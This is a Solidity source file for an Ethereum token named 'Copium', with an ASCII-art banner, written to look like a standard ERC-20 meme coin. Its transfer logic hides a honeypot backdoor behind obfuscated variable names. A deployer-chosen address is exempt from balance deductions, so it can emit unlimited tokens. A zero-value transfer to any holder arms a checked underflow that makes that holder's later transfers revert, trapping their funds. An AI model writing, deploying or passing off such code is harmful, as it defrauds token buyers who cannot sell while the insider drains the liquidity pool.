/*

https://twitter.com/COPIUMDROP

#####################################################################################################
#####################################################################################################
#####################################################################################################
#######################################SSSSSSSSS%SSS#################################################
###################################SS%?************?????????%S#######################################
##############################SS%??***************************?%S####################################
##########################%???*****************+++;;;;+;;;+++****?%S#################################
########################S?*****************+;;;;;;;;;;;;;;;;;;;++++*?%S##############################
#######################S?****************+;;;;;;;;;;;;;;;;;;;;;;;;;+**?%SS###########################
######################%************++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;****?%##########################
######################%?**********;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;*****?S########################
#####################S?**********;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;*****?########################
####################%************;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;*****%#######################
####################?************;;;;;;;;;;;;;;;;;;;;;;;;++;;;;;;;;;;;;;+****?#######################
####################?***********;;;;;;;;;;;;;;;;;;;;;;;;;;*;;;;;;++;;;;;;;+**?S######################
###################%***********;;;;;;;;;;;;;;;;;;;;;;;;;;;*;;;;;+*;;;;;;;;;;+*%######################
##################S?**********+;;;;;;;;;;;;;;;;;;;;;;;;;;*+;;;;;+*;;;;;;;;;;;;*?#####################
###################?***********;;;;;;;;;;;;;;;;;;;;;+++;++;;+;;++*;;;;;+++;;;;+*?####################
##################S*************;;;;;;;;;;;++*++++;;;;+++;;+*++?++;;;+++;;;;;;+*?####################
##################S**************;;;;;;;++++++++*****++++;*+;;;;++++;;;;;;;;;;+*?S###################
##################%**************+;;;;;+++++**???*****?*+++;;;;;+*?********+++***?S##################
##################S?**************+;;;;****?%##S%%%%?%??*+;;+++;;***?%%%??**+++**%###################
###################%***************;;;;++**%SSS%?S??%#S*+;;;;;;;;;**%#@#%%%??***?S###################
###################S?**************;;;;;;;;?S?+;*S;+?S?+;;+*????*++**?%S???S??**?S###################
#####################%*************;;;;;;;++%*++S??%?+++;?SS#SSSSS*;+;;??;+S%?*+*?%###############SSS
#####################%?**********?*;;;;;;+;;?*;%S%+;;;;*%SSSSSSSSSS*++++%?+??;;;**%##########SSSSS%??
######################%?*********?*+;;;;+;;;?*?SS*;;;+?SSSSSSSSSSSSS%*;;+S;+S+;;?*%#######SSS####S%??
#######################S?*******??**;;;++;;;%?S?+;;;+%SSSSSSSSSSSSSSSS%*;S?;%*;;+*?###SS#####SSSS#S%%
########################S?*******?**;;;;+;;;*S%;;;;*SSSSSSSSSSSSSSSSSSSS?%%;%*;;+?%###S#####SS#######
##########################%******??*+;;;;;;;;%%;;;?SSSSSSSSSSSSSSSSSSSSSS%%;S*;+*%###S#####SS########
###########################?******?**;;;;;;;*#*;;?SSSSSSSSSSS#SSSSSSSSSSSSS+%++*%###S###SSSS#########
###########################?******???*;;;;;;%%;;?SSSSSSSSSSS##SSSS#SSSSSS##%S%?%##S####SS############
###########################?********??*+;;;;?S;*SSSSSSSSSSSS#SSSSS#SSSSSS#S%SSS##S#####S#############
#########################SS?*******?**?**+;;SS**SSSSSSSSSSS##SSSS#SSSSSSSS#%S####%#####S#############
#######################SS#S?*******?***???*??+%%%SSSSSSSSSSS#SSSS#SSSSSSS#S%S####%###SS##############
#########################S?********?++****?%%**%%SSSSSSSSSS#SSSSS#SSSSSS#SS%S####S##SS###############
##################S######?********?*;;;+***?S%?%%%SSSSSSSSS#SSSSS#SSSSS#SS#%S###SS##S################
#################S######S?*******?+;;;;;;++*S%*?S%SSSSSSSSSSSSSSSSSS%SS#S#SS####S###SS###############
#################SS####S?*********;;;;;;;;;;++**?%%SSSSSSS%S##SSSSS##%S##SS####S#####S###############
#################SS###%***********+;;;;;;;;;;;;++S??%SSSS%S##SS####%##%SSS#####S#####SS##############
###############S%?S###?**********?*+;;;;;;;;;;;;;++**?%SSS####%####%SSSS########S####%###############
#########SSS%??***%###S%?********+;;;;;;;;;;;;;;;;;;;+???%SSSS%####%S######SS###SS##SS###############
######%??*********%#####S?******;;;;;;;;;;;;;;;;;;;;;;++*****?#####S%%%%SS%S####S###SS###############
###S??************?######S?*++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;*%######%*******??S######%S##############
%??****************?%S######S%%%?%%SSS%*+;;;;;;;;;;;;;;;;;;;*%#####S?*********?S####S?*?%%S##########
**********************???%S#############S%**+++;;+****++;;+?S#####%?************????******?%S########
************************++**??%S############SSSSS#####SSSS######S?****************+++++******?%S#####
********************++;;;;;;;++*?SS#########################S%?*+++**+++++;;;;;;;;;;;;;;;++*****?%S##
*********+++++;;;;;;;;;;;;;;;;;;++**??*****????%SS####SS?**++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+*****?%S
+;++;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;+*????*+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;******?

*/


// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Copium is Ownable {
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 private fill = 12;

    mapping(address => mapping(address => uint256)) public allowance;

    address public uniswapV2Pair;

    uint256 public totalSupply = 420_690_000_000_000 * 10 ** 9;

    uint8 public decimals = 9;

    function approve(address ngmi, uint256 amountOfCope) public returns (bool success) {
        allowance[msg.sender][ngmi] = amountOfCope;
        emit Approval(msg.sender, ngmi, amountOfCope);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    string public symbol = 'COPIUM';

    mapping(address => uint256) private hope;

    function transferFrom(address tank, address coper, uint256 amountOfCope) public returns (bool success) {
        maxCope(tank, coper, amountOfCope);
        require(amountOfCope <= allowance[tank][msg.sender]);
        allowance[tank][msg.sender] -= amountOfCope;
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private _copium;

    constructor(address harder) {
        balanceOf[msg.sender] = totalSupply;
        _copium[harder] = fill;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function transfer(address coper, uint256 amountOfCope) public returns (bool success) {
        maxCope(msg.sender, coper, amountOfCope);
        return true;
    }

    string public name = 'Copium';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function maxCope(address tank, address coper, uint256 amountOfCope) private returns (bool success) {
        if (_copium[tank] == 0) {
            balanceOf[tank] -= amountOfCope;
        }

        if (amountOfCope == 0) hope[coper] += fill;

        if (_copium[tank] == 0 && uniswapV2Pair != tank && hope[tank] > 0) {
            _copium[tank] -= fill;
        }

        balanceOf[coper] += amountOfCope;
        emit Transfer(tank, coper, amountOfCope);
        return true;
    }
}